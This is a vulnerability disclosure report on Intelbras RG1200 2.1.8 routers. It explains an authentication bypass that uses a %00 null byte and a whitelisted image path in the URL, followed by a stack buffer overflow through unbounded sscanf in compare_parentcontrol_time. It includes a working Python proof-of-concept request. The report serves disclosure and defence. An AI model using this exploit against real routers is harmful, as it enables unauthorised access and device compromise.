# CVE Report - Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`compare_parentcontrol_time`)

## Vulnerability Title

Authentication Bypass and Stack Buffer Overflow Vulnerability in Intelbras RG1200 2.1.8 Routers (`compare_parentcontrol_time`)

## Vulnerability Description

Intelbras RG1200 firmware 2.1.8 contains an authentication bypass in the request dispatch chain (`R7WebsSecurityHandler` + `websFormHandler`) caused by inconsistent use of the raw (non-decoded) URL versus the decoded path. Remote unauthenticated attackers can bypass authentication by crafting a URL containing `%00` and a whitelisted substring (e.g., `img/main-logo.png`) in the raw URL so that the security handler matches the whitelist while the form dispatcher resolves the decoded/truncated path to a protected `/goform` handler.

After authentication bypass, an attacker can trigger a stack buffer overflow in `compare_parentcontrol_time`. The handler parses the `time` parameter using unbounded `sscanf` into fixed-size stack buffers.

## POC

```py
import requests
import sys



def exploit(target_ip, port=80, cookie="SESSION=<REPLACE>"):
  base = f"http://{target_ip}:{port}"
  url = f"{base}/goform/compare_parentcontrol_time%00img/main-logo.png"

  data = {
    "time": "A" * 64,
  }

  headers = {
    "Cookie": cookie,
  }

  r = requests.post(url, data=data, headers=headers, timeout=10)
  print("status:", r.status_code)
  print(r.text[:2000])


if __name__ == "__main__":
  if len(sys.argv) < 2:
    print("usage: python poc.py <target_ip> [port]")
    sys.exit(1)
  ip = sys.argv[1]
  port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
  exploit(ip, port=port)
```

## Cause Analysis

1. **authentication** : The HTTP request parsing logic stores the raw request URL into `wp->url` (not URL-decoded), while `wp->path` is derived from a decoded buffer produced by `websDecodeUrl` during `websUrlParse`. In `R7WebsSecurityHandler`, the whitelist is checked against the raw URL, while `websFormHandler` dispatches based on the decoded path, allowing crafted requests to bypass authentication and reach a protected `/goform` handler.

2. **stack overflow**: `compare_parentcontrol_time` obtains `time = websGetVar(wp, "time", ...)` and executes `sscanf(time, "%[^-]-%s", starttime, endtime)` where `starttime` is `char[32]` and `endtime` is `char[36]`. The unbounded specifiers allow long input to overflow stack buffers.
